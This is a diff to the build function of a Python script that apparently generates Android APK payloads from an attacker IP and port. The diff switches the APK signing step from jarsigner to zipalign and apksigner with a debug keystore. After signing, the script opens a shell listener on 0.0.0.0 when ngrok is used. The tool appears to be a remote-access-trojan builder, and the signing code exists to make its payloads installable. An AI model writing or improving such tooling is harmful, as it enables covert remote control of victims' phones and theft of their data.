@@ -399,52 +399,60 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
     resOut = que.get()
     if not resOut.returncode:
         print(stdOutput("success")+"Successfully apk built in \033[1m\033[32m"+getpwd(outFileName)+"\033[0m")
-        print(stdOutput("info")+"\033[0mSigning the apk")
-        # Locate jarsigner/keytool from bundled JDK, system PATH, or JAVA_HOME
+        print(stdOutput("info")+"\033[0mAligning and signing the apk")
+        # Ensure we have zipalign and apksigner
         import shutil
         is_win = platform.system() == "Windows"
-        _exe = lambda n: n + (".exe" if is_win else "")
-        _jdk_dir = os.path.dirname(java_bin.strip('"')) if java_bin != "java" else ""
-        def _find_tool(name):
-            if _jdk_dir:
-                p = os.path.join(_jdk_dir, _exe(name))
-                if os.path.isfile(p): return '"' + p + '"'
-            found = shutil.which(name)
-            if found: return '"' + found + '"'
-            java_home = os.environ.get("JAVA_HOME", "")
-            if java_home:
-                p = os.path.join(java_home, "bin", _exe(name))
-                if os.path.isfile(p): return '"' + p + '"'
-            if not is_win:
-                r = execute("readlink -f $(which java) 2>/dev/null || which java")
-                if r.returncode == 0:
-                    p = os.path.join(os.path.dirname(r.stdout.strip()), name)
-                    if os.path.isfile(p): return '"' + p + '"'
-            return name
-        keytool_bin = _find_tool("keytool")
-        jarsigner_bin = _find_tool("jarsigner")
-        if jarsigner_bin == "jarsigner" and shutil.which("jarsigner") is None:
-            print("\r" + stdOutput("error") + "jarsigner not found! You need the Java Development Kit (JDK) to sign APKs.")
-            print(stdOutput("info") + "\033[1mOn Kali/Ubuntu run: \033[32msudo apt install default-jdk\033[0m")
-            sys.exit(1)
-            
-        keystore = os.path.join(os.path.dirname(os.path.abspath(__file__)), "jar_utils", "debug.keystore")
-        if not os.path.isfile(keystore):
-            execute(keytool_bin+' -genkeypair -v -keystore "'+keystore+'" -alias androiddebugkey -keyalg RSA -keysize 2048 -validity 10000 -storepass android -keypass android -dname "CN=Android Debug,O=Android,C=US"')
-        t = threading.Thread(target=executeCMD,args=[jarsigner_bin+' -sigalg SHA256withRSA -digestalg SHA-256 -keystore "'+keystore+'" -storepass android -keypass android "'+outFileName+'" androiddebugkey',que],)
+        jar_dir = os.path.dirname(os.path.abspath(__file__))
+        zipalign_bin = os.path.join(jar_dir, "jar_utils", "zipalign.exe" if is_win else "zipalign")
+        apksigner_bat = os.path.join(jar_dir, "jar_utils", "build-tools", "android-14", "apksigner.bat")
+
+        if is_win:
+            apksigner_cmd = '"' + apksigner_bat + '" sign'
+        else:
+            if shutil.which("zipalign") is None or shutil.which("apksigner") is None:
+                print("\r" + stdOutput("error") + "Missing build tools! You need zipalign and apksigner.")
+                print(stdOutput("info") + "\033[1mOn Kali/Ubuntu run: \033[32msudo apt install zipalign apksigner\033[0m")
+                sys.exit(1)
+            zipalign_bin = "zipalign"
+            apksigner_cmd = "apksigner sign"
+
+        aligned_apk = outFileName.replace(".apk", "_aligned.apk")
+        keystore = os.path.join(jar_dir, "jar_utils", "debug.keystore")
+
+        # 1. Zipalign
+        t = threading.Thread(target=executeCMD,args=['"'+zipalign_bin+'" -p -f 4 "'+outFileName+'" "'+aligned_apk+'"',que],)
+        t.start()
+        while t.is_alive(): animate("Aligning Apk ")
+        t.join()
+        que.get()  # consume zipalign result
+
+        # 2. Sign with v1/v2/v3: --min-sdk-version bypasses the broken manifest reader
+        sign_cmd = (apksigner_cmd
+            + ' --min-sdk-version 24'
+            + ' --v1-signing-enabled true'
+            + ' --v2-signing-enabled true'
+            + ' --v3-signing-enabled true'
+            + ' --ks "'+keystore+'"'
+            + ' --ks-pass pass:android'
+            + ' --key-pass pass:android'
+            + ' "'+aligned_apk+'"')
+        t = threading.Thread(target=executeCMD,args=[sign_cmd,que],)
         t.start()
         while t.is_alive(): animate("Signing Apk ")
         t.join()
         print(" ")
-        resOut = que.get()
-        if not resOut.returncode:
+        resOut2 = que.get()
+
+        if not resOut2.returncode and os.path.isfile(aligned_apk):
+            shutil.move(aligned_apk, outFileName)
             print(stdOutput("success")+"Successfully signed the apk \033[1m\033[32m"+outFileName+"\033[0m")
             if ngrok:
                 clear()
                 get_shell("0.0.0.0",8000) if not ng else get_shell("0.0.0.0",ng)
             print(" ")
         else:
-            print("\r"+resOut.stderr)
+            print("\r"+resOut2.stderr)
             print(stdOutput("error")+"Signing Failed")
     else:
         print("\r"+resOut.stderr)
